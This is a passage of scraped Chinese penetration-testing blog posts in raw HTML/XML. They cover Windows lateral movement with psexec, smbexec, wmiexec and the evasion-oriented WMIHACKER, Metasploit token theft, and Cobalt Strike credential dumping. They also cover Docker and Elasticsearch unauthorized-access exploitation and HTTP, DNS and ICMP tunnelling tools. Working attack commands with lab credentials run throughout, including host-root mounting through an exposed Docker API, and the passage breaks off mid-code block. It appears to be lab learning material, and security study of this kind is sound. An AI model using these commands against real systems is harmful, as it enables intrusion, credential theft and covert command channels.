<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240208112303602.png" alt="image-20240208112303602"></p><p>不是很好使用</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">C:\&gt;psexec.exe de1ay/administrator:<span class="hljs-symbol">1qaz@</span><span class="hljs-symbol">WSX3e@</span><span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.201</span> whoami<br></code></pre></td></tr></table></figure><p>直接执行命令</p></li></ul><h2 id="Smbexec-py"><a href="#Smbexec-py" class="headerlink" title="Smbexec.py"></a>Smbexec.py</h2><p>impacket套件  </p><p>smbexec是一款基于psexec的域渗透测试工具，并配套samba工具。  </p><p>445端口</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">C</span>:\&gt;smbexec.py de1ay/administrator:<span class="hljs-number">1</span>qaz@WSX3e@<span class="hljs-number">10.10.10.201</span><br><span class="hljs-attribute">Impacket</span> v0.<span class="hljs-number">9</span>.<span class="hljs-number">17</span> - Copyright <span class="hljs-number">2019</span> SecureAuth Corporation<span class="hljs-meta"></span><br><span class="hljs-meta">[!] Launching semi-interactive shell - Careful what you execute</span><br></code></pre></td></tr></table></figure><h2 id="wmiexec"><a href="#wmiexec" class="headerlink" title="wmiexec"></a>wmiexec</h2><ol><li><p>wmiexec.vbs</p><blockquote><p>  基本原理：当用户输入命令时，WMI创建进程执行该命令，然后把结果输出到文件，这个文件位于之  前创建的共享文件夹。最后，通过FSO组件访问远程共享文件夹（需要用到445端口）中的结果文件，  将结果输出。当结果读取完成时，调用WMI执行命令删除结果文件。最后当WMIEXEC退出时，删除文  件共享。  </p></blockquote><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">cscript</span>.exe wmiexec.vbs<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240208152502212.png" alt="image-20240208152502212"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cscript.exe wmiexec.vbs   /cmd 192.168.79.135 Administrator root <span class="hljs-built_in">whoami</span> <br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240208153009014.png" alt="image-20240208153009014"></p><p>获取shell</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">cscript</span>.exe wmiexec.vbs   /<span class="hljs-keyword">shell</span> 192.168.93.135 Administrator root <br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240208154152375.png" alt="image-20240208154152375"></p><p>利用cs半交互式</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">shell</span><span class="language-bash"> cscript.exe //nologo c:\wmiexec.vbs /shell ip username password</span><br></code></pre></td></tr></table></figure><p>注意</p><ul><li>wmi只是创建进程,没办法去判断一个进程是否执行完成(比如ping),这样就导致wmi.dll删除不成,下一次  又是被占用,这时候修改一下vbs里面的名字就好：Const FileName &#x3D; “wmi1.dll”,也可以加入-persist参数  (后台运行)  </li><li>非域用户登陆到win08和2012中,只有administrator可以登陆成功,其他管理员账号会出现WMIEXEC ERROR: Access is denied</li></ul></li><li><p>WMI-HACKER</p><blockquote><p>  介绍：免杀横向渗透远程命令执行，常见的WMIEXEC、PSEXEC执行命令是创建服务或调用  Win32_Process.create执行命令，这些方式都已经被杀软100%拦截，通过改造出WMIHACKER免杀横  向移动测试工具。此工具通过135端口进行命令执行，读取执行结果以及进行文件传输时无需445端口，通过把执行结果写入注册表中，然后进行读取</p></blockquote><p>  主要功能：1、命令执行；2、文件上传；3、文件下载  </p><p>使用</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240208161525817.png" alt="image-20240208161525817"></p><p>有命令回显</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cscript</span> WMIHACKER_0.<span class="hljs-number">6</span>.vbs /cmd <span class="hljs-number">172.16.94.187</span> administrator <span class="hljs-string">&quot;Password!&quot;</span> <span class="hljs-string">&quot;systeminfo&quot;</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240208161840240.png" alt="image-20240208161840240"></p><p>这里是system权限是因为由于该脚本是写入注册表的方式，创建注册表的方式执行都是system权限 </p><p>无命令回显</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cscript</span> WMIHACKER_0.<span class="hljs-number">6</span>.vbs /cmd <span class="hljs-number">172.16.94.187</span> administrator <span class="hljs-string">&quot;Password!&quot;</span> <span class="hljs-string">&quot;systeminfo &gt; c:\1.txt 0</span><br></code></pre></td></tr></table></figure><p>这个只是将结果导入到文件里面</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240208162102933.png" alt="image-20240208162102933"></p><figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs node-repl">文件上传-复制本机calc.exe到远程主机c:\calc.exe<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">cscript wmihacker_0<span class="hljs-number">.4</span>.<span class="hljs-property">vbe</span> /upload <span class="hljs-number">172.16</span><span class="hljs-number">.94</span><span class="hljs-number">.187</span> administrator <span class="hljs-string">&quot;Password!&quot;</span> <span class="hljs-string">&quot;c:\windows\system32\calc.exe&quot;</span> <span class="hljs-string">&quot;c:\calc&quot;</span></span><br><br>文件下载-下载远程主机calc.exe到本地c:\calc.exe<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">cscript wmihacker_0<span class="hljs-number">.4</span>.<span class="hljs-property">vbe</span> /download <span class="hljs-number">172.16</span><span class="hljs-number">.94</span><span class="hljs-number">.187</span> administrator <span class="hljs-string">&quot;Password!&quot;</span> <span class="hljs-string">&quot;c:\calc&quot;</span><span class="hljs-string">&quot;c:\windows\system32\calc.exe&quot;</span></span><br><br></code></pre></td></tr></table></figure></li></ol><h2 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h2><h3 id="Psexec-1"><a href="#Psexec-1" class="headerlink" title="Psexec"></a>Psexec</h3><p>执行直接就获取到meterpreter的PTH模块  </p><p>exploit&#x2F;windows&#x2F;smb&#x2F;psexec  </p><p>设置</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">set</span> rhost<br><span class="hljs-built_in">set</span> smbuser<br><span class="hljs-built_in">set</span> smbpass<br><span class="hljs-built_in">set</span> lport  <br><span class="hljs-built_in">set</span> payload bind_tcp<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240208164442538.png" alt="image-20240208164442538"></p><p>使用ms17_010</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240208164648437.png" alt="image-20240208164648437"></p><h3 id="Token窃取"><a href="#Token窃取" class="headerlink" title="Token窃取"></a>Token窃取</h3><p>  Windows有两种类型的Token：  </p><blockquote><p>Delegation token(授权令牌):用于交互会话登录(例如本地用户直接登录、远程桌面登录)  </p><p>Impersonation token(模拟令牌):用于非交互登录(利用net use访问共享文件夹)  </p></blockquote><p>  两种token只在系统重启后清除  </p><blockquote><p>具有Delegation token的用户在注销后，该Token将变成Impersonation token，依旧有效  </p></blockquote><p>  在Metasploit中，可使用incognito实现token窃取，Metasploit中的incognito，是从windows平台  下的incognito移植过来的  </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 加载incognito模块</span><br><span class="hljs-attribute">load</span> incognito<br><br><span class="hljs-comment"># 列举token</span><br><span class="hljs-attribute">list_tokens</span> -u<br><br><span class="hljs-comment"># 查看当前token</span><br><span class="hljs-attribute">getuid</span><br><br><span class="hljs-comment"># 提示至system权限</span><br><span class="hljs-attribute">getsystem</span><br><br><span class="hljs-comment"># token窃取</span><br><span class="hljs-attribute">impersonate_token</span> <span class="hljs-string">&quot;NT AUTHORITY\\SYSTEM&quot;</span><br><br><span class="hljs-comment"># 从进程窃取token</span><br><span class="hljs-attribute">steal_token</span> <span class="hljs-number">4500</span><br><br><span class="hljs-comment"># 返回之前token</span><br><span class="hljs-attribute">rev2self</span>、drop_token<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240208170015446.png" alt="image-20240208170015446"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240208170023652.png" alt="image-20240208170023652"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240208170035437.png" alt="image-20240208170035437"></p><p>用法总结</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-number">1.</span> 先获取对应的<span class="hljs-keyword">token</span><br>steal_token <span class="hljs-number">4500</span><br><br><span class="hljs-number">2.</span> 使用的对应的<span class="hljs-keyword">token</span><br>impersonate_token <span class="hljs-string">&quot;NT AUTHORITY\\SYSTEM&quot;</span><br><br><span class="hljs-number">3.</span> 使用完之后就是以当前的身份了，假设开启了一个<span class="hljs-built_in">shell</span> 将是以该身份开启的<br><br></code></pre></td></tr></table></figure><p>知识回顾</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">查看当前主机的账户<br>net <span class="hljs-keyword">user</span> <span class="hljs-title">/DOMAIN</span><br><br><br>查看某一个用户的具体的身份<br>net <span class="hljs-keyword">user</span>  <span class="hljs-title">name</span> /domain<br></code></pre></td></tr></table></figure><h2 id="cs"><a href="#cs" class="headerlink" title="cs"></a>cs</h2><p>凭证获取</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">hashdump</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240208171704134.png" alt="image-20240208171704134"></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">logonpasswords</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240208171736453.png" alt="image-20240208171736453"></p><p>使用步骤</p><ol><li><p>端口扫描</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240208171844023.png" alt="image-20240208171844023"></p></li><li><p>收集hash</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">hashdump</span><br></code></pre></td></tr></table></figure><p>发现hash 太少了</p><p>尝试提权</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bypassuac</span>：将本地中级管理员权限提升至本地高级管理员权限，适用于Win <span class="hljs-number">7</span> 及以上的系统<br><span class="hljs-attribute">elevate</span>：将任意用户的权限提升至系统权限，适用于<span class="hljs-number">2018</span>年<span class="hljs-number">11</span>月更新之前的 Win <span class="hljs-number">7</span> 和 Win <span class="hljs-number">10</span> 系统<br><span class="hljs-attribute">getsystem</span>：将本地高级管理员权限提升至系统权限<br><span class="hljs-attribute">runas</span>：使用其他用户的凭证来以其他用户身份运行一个命令，该命令不会返回任何输出<br><span class="hljs-attribute">spawnas</span>：使用其他用户的凭证来以其他用户身份派生一个会话，这个命令派生一个临时的进程并将 payload stage 注入进那个进程<br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Docker未授权访问漏洞</title>
    <link href="/2024/02/01/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Docker%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"/>
    <url>/2024/02/01/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Docker%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -sV -p- -T4 <span class="hljs-number">10.1.1.200</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20240201220623616.png" alt="image-20240201220623616"></p><p>2375 就是docker 的远程操控端口</p><p>如果访问2375端口出现下面这样就是存在漏洞</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20240201220807954.png" alt="image-20240201220807954"></p><p>通过<code>/info</code>目录得到docker 信息</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20240201221113830.png" alt="image-20240201221113830"></p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">docker -H tcp:L<span class="hljs-regexp">//</span><span class="hljs-number">10.1</span>.<span class="hljs-number">1.200</span> ps -a<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20240201221221484.png" alt="image-20240201221221484"></p><p>启动一个容器</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> -H tcp://<span class="hljs-number">10.1.1.200</span> start <span class="hljs-number">3</span>dc8d67b679d <br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20240201221505633.png" alt="image-20240201221505633"></p><p>进入一个容器</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20240201221714944.png" alt="image-20240201221714944"></p><p>创建一个busybox容器，但后将宿主的磁盘挂载到容器当中</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">docker -H tcp:<span class="hljs-regexp">//</span><span class="hljs-number">10.1</span>.<span class="hljs-number">1.200</span>:<span class="hljs-number">2375</span> run -it -v <span class="hljs-regexp">/:/m</span>nt busybox chroot /mnt sh<br></code></pre></td></tr></table></figure><ol><li>docker未授权写ssh公钥获得shell</li><li>写定时任务反弹shell</li></ol><h1 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h1><p>修复建议</p><ol><li><p>设置ACL，只允许信任ip连接对应端口</p><blockquote><p><a href="https://blog.csdn.net/qq_28929579/article/details/132337504">docker部署rocketmq 4.9.7 并开启ACL 和 dashboard 账号密码_使用docker-compose安装rocketmq4.9.7-CSDN博客</a></p></blockquote></li><li><p>开启TLS，使用生成的证书进行认证：<br><a href="https://docs.docker.com/engine/security/protect-access/">https://docs.docker.com/engine/security/protect-access/</a></p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Elasticsearch未授权访问</title>
    <link href="/2024/02/01/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Elasticsearch%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
    <url>/2024/02/01/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Elasticsearch%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="简绍"><a href="#简绍" class="headerlink" title="简绍"></a>简绍</h1><blockquote><p>Elasticsearch是一个开源的高扩展的分布式全文搜索引擎，他可以近乎实时的存储、检索数据，本身扩展性很好，可以扩展到上百台服务器，处理PB级别的数据，Elasticsearch也使用Java开发并使用Lucene作为其核心来实现所有索引和搜索的功能，但是它的目的是通过简单的RESTful API来隐藏Lucene的复杂性，从而让全文搜索变得简单。</p></blockquote><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p><a href="https://blog.csdn.net/MissOfSpring/article/details/107062483">Elasticsearch(ES)的下载与安装_es官网证明下载依赖-CSDN博客</a></p><h1 id="直接访问9200"><a href="#直接访问9200" class="headerlink" title="直接访问9200"></a>直接访问9200</h1><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spark%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/image-20240201182627105.png" alt="image-20240201182627105"></p><p>可以对相关的api访问数据</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spark%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/image-20240201182726945.png" alt="image-20240201182726945"></p><p>因为这个没有添加hsu’ju</p>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>http_dns_icmp</title>
    <link href="/2024/01/31/%E6%B8%97%E9%80%8F/http-dns-icmp/"/>
    <url>/2024/01/31/%E6%B8%97%E9%80%8F/http-dns-icmp/</url>
    
    <content type="html"><![CDATA[<h1 id="HTTP代理"><a href="#HTTP代理" class="headerlink" title="HTTP代理"></a>HTTP代理</h1><p>效果可能不是那么的好，因为会存在防火墙，可能存在进出的规则</p><h2 id="Neo-reGeorg"><a href="#Neo-reGeorg" class="headerlink" title="Neo-reGeorg"></a>Neo-reGeorg</h2><blockquote><p><a href="https://github.com/sensepost/reGeorg">https://github.com/sensepost/reGeorg</a><br><a href="https://github.com/NoneNotNull/reGeorg">https://github.com/NoneNotNull/reGeorg</a>  </p></blockquote><p>  reGeorg 是 reDuh 的升级版，主要功能是把内网服务器端口的数据通过 HTTP&#x2F;HTTPS 隧道转发到本  机，实现基于 HTTP 协议的通信。  </p><p>  reGeorg支持 ASPX，ASHX，PHP，JSP等WEB脚本，并特别提供了一个 tomcat5版本。  </p><blockquote><p><a href="https://github.com/L-codes/Neo-reGeorg">https://github.com/L-codes/Neo-reGeorg</a>  </p></blockquote><blockquote><p>python3 neoreg.py -h</p><p>可选参数:<br>  -h, - -help                    显示此帮助消息并退出<br>  -u URI, –url URI             包含隧道脚本的URL<br>  -k KEY, –key KEY             指定连接密钥<br>  -l IP, –listen-on IP         默认的监听地址。（默认：127.0.0.1）<br>  -p PORT, –listen-port PORT      默认的监听端口。（默认：1080）<br>  -s, –skip                    跳过可用性测试<br>  -H LINE, –header LINE          将自定义header LINE传递给服务器<br>  -c LINE, –cookie LINE         自定义初始化Cookie<br>  -x LINE, –proxy LINE         proto:&#x2F;&#x2F;host[:port]在给定端口上使用代理<br>  –local-dns                   本地读取缓冲区，每个POST发送的最大数据量（默认值：2048 最大：2600）<br>  –read-buff Bytes             本地读取缓冲区，每个POST发送的最大数据量（默认值：2048 最大：2600）<br>  –read-interval MS            读取数据间隔，以毫秒为单位。（默认值：100）<br>  –max-threads N               代理最大线程数（默认值：1000）<br>  -v                            提高详细程度（使用-vv或更多以获得更好的效果）</p></blockquote><h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><ol><li><p>设置密码生成tunnel上传到服务器</p><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs verilog">python .\neoreg<span class="hljs-variable">.py</span> <span class="hljs-keyword">generate</span> -k passwd<br></code></pre></td></tr></table></figure></li><li><p>将脚本上传到web服务</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/image-20240131094820704.png" alt="image-20240131094820704"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/image-20240131094853905.png" alt="image-20240131094853905"></p></li><li><p>我们可以直接访问，但是不会显示内容，但是我们可以使用webshell管理工具发现这个</p></li><li><p>连接隧道</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">python .\neoreg.py -k passwd -u http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">79.140</span><span class="hljs-regexp">/public/</span>tunnel.php<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/image-20240131095033687.png" alt="image-20240131095033687"></p></li><li><p>尝试访问内网</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/image-20240131095249474.png" alt="image-20240131095249474"></p><p>没有挂代理访问失败</p></li><li><p>设置代理</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/image-20240131095432268.png" alt="image-20240131095432268"></p></li><li><p>成功代理</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/image-20240131095509215.png" alt="image-20240131095509215"></p><p>感觉效果不是很好</p></li></ol><h1 id="DNS隧道"><a href="#DNS隧道" class="headerlink" title="DNS隧道"></a>DNS隧道</h1><h2 id="Dnscat2"><a href="#Dnscat2" class="headerlink" title="Dnscat2"></a>Dnscat2</h2><ol><li><p>简介</p><blockquote><p>  dnscat2是一个DNS隧道工具，通过DNS协议创建加密的命令和控制通道，它的一大特色就是服务端  会有一个命令行控制台，所有的指令都可以在该控制台内完成。包括：文件上传、下载、反弹Shell。  </p></blockquote></li><li><p>支持的type类型</p><blockquote><p>A<br>TXT<br>CNAME<br>MX<br>AAAA</p></blockquote><p>相关解释</p><blockquote><p>Type：DNS解析的类型，常见的有：A、CNAME、MX、TXT。</p><p>A: 域名的IPv4地址。<br>AAAA: 域名的IPv6地址。<br>CNAME: 域名的别名。<br>可以理解为域名的重定向吧，主要方便IP地址的变更。<br>比如cdn厂商会给客户企业分配固定的cname而不是IP，如果分配IP，cdn厂商做IP调整就受限哪些客户企业的哪些域名绑定了这个IP，需要沟通服务迁移。<br>还有在企业多个域名（www&#x2F;mail&#x2F;ftp或其他业务分类的域名）对应一个入口IP地址时候，也可以给多个域名做cname，便于后期的IP调整。<br>总之，别名是一种松耦合的处理办法。<br>MX: smtp邮箱域名的IP地址。给client端指明某个域名的邮件服务器地址。<br>PTR: 根据IP反向查找域名。<br>SRV: 服务的IP地址记录，包含ip、port、priority、weight。<br>TXT： 名的文本记录。可以记录联系方式、服务版本信息、反垃圾邮件等。<br>NS: dns zone。指定哪个域名服务器可以解析该域名的子域名。<br>SOA: 授权机构记录，记录ns中哪个是主服务器。</p></blockquote></li><li><p>安装</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs vim">apt install <span class="hljs-keyword">ruby</span> <span class="hljs-keyword">ruby</span>-dev git <span class="hljs-keyword">make</span> g++ <span class="hljs-keyword">ruby</span>-bundler<br>gem install bundler<br><br>git clone https://github.<span class="hljs-keyword">com</span>/iagox86/dnscat2.git<br><span class="hljs-keyword">cd</span> dnscat2/server<br>bundle install<br></code></pre></td></tr></table></figure></li></ol><h1 id="ICMP"><a href="#ICMP" class="headerlink" title="ICMP"></a>ICMP</h1><p>通过某种信道获取了内网主机的shell，但是当前信道不适合做远控的通信信道，TCP和UDP等传输  层协议不能出网，DNS、HTTP等应用层协议也不能出网，只有ICMP协议可以出网。</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/image-20240131123000346.png" alt="image-20240131123000346">  </p><h2 id="pingtunnel"><a href="#pingtunnel" class="headerlink" title="pingtunnel"></a>pingtunnel</h2><p>通过伪造ping，把tcp&#x2F;udp&#x2F;sock5流量通过远程服务器转发到目的服务器上。用于突破某些运营商封锁TCP&#x2F;U  DP流量。  </p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 